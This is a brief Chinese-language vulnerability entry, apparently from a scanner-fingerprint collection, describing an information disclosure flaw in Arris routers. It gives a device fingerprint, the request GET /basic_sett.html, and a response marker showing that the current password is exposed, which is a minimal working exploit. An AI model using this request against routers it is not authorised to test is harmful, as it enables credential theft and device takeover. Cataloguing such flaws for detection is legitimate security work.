# Arris路由器basic_sett信息泄露漏洞

Arris ｜ 信息泄露 ｜ —
- **指纹**：`body="base64encode(document.tF.pws.value)"`
- **请求**：`GET /basic_sett.html HTTP/1.1`
- **响应特征**：200 cur_passwd